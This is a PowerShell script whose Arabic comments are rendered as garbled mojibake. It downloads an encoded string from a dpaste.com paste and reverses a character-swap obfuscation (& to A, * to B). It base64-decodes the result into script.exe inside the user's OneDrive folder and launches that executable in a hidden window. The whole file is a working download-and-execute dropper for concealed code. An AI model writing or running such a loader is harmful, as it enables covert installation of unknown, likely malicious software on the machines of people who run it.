#  ÕœÌœ «·—«»ÿ «·–Ì ÌÕ ÊÌ ⁄·Ï «·”·”·… «·‰’Ì… «·„‘›—…
$url = "https://dpaste.com/FK3HL52TP.txt"

#  ÕœÌœ «·„”«— ·Õ›Ÿ «·”·”·… «·„‘›—… «·„Õ„·… ›Ì OneDrive
$oneDriveFolder = "C:\Users\$env:USERNAME\OneDrive\MyApp"
$outputFile = "$oneDriveFolder\base64_data.txt"
$outputExe = "$oneDriveFolder\script.exe"

# «· √ﬂœ „‰ ÊÃÊœ «·„Ã·œ ›Ì OneDrive° ≈–« ·„ Ìﬂ‰ „ÊÃÊœ« ”Ì „ ≈‰‘«ƒÂ
if (-not (Test-Path $oneDriveFolder)) {
    New-Item -ItemType Directory -Path $oneDriveFolder
}

#  Õ„Ì· «·”·”·… «·‰’Ì… „‰ «·—«»ÿ ≈·Ï «·„·›
Invoke-WebRequest -Uri $url -OutFile $outputFile

# «· Õﬁﬁ „‰ √‰ «·”·”·…  „  Õ„Ì·Â« »‰Ã«Õ
if (Test-Path $outputFile) {
    Write-Host "Base64 string downloaded successfully."
} else {
    Write-Host "Error downloading Base64 string."
    exit
}

# ﬁ—«¡… «·”·”·… «·‰’Ì…
$base64String = Get-Content -Path $outputFile -Raw

# «” —Ã«⁄ «·Õ—Ê› «·√’·Ì… ﬁ»· ›ﬂ «· ‘›Ì— («” »œ«· & »‹ A Ê * »‹ B)
$base64String = $base64String -replace '&', 'A' -replace '\*', 'B'

# «· Õﬁﬁ „‰ «·”·”·… »⁄œ «·«” »œ«·
Write-Host "Modified Base64 string:"
Write-Host $base64String

#  ÕÊÌ· «·”·”·… ≈·Ï »«Ì « 
try {
    $bytes = [Convert]::FromBase64String($base64String)
} catch {
    Write-Host "Error converting Base64 string to bytes: $_"
    exit
}

# ﬂ «»… «·»Ì«‰«  ≈·Ï «·„·› EXE
[System.IO.File]::WriteAllBytes($outputExe, $bytes)

#  Õﬁﬁ „„« ≈–«  „ ≈‰‘«¡ EXE »‰Ã«Õ
if (Test-Path $outputExe) {
    Write-Host "EXE file created successfully at: $outputExe"
    
    # ≈÷«›…  √ŒÌ— »”Ìÿ ﬁ»· „Õ«Ê·…  ‘€Ì· EXE
    Start-Sleep -Seconds 2

    #  ‘€Ì· EXE ›Ì «·Œ·›Ì… »«” Œœ«„ Start-Process
    Start-Process -FilePath $outputExe -WindowStyle Hidden

    Write-Host "EXE is now running in the background."
} else {
    Write-Host "Failed to create EXE."
}
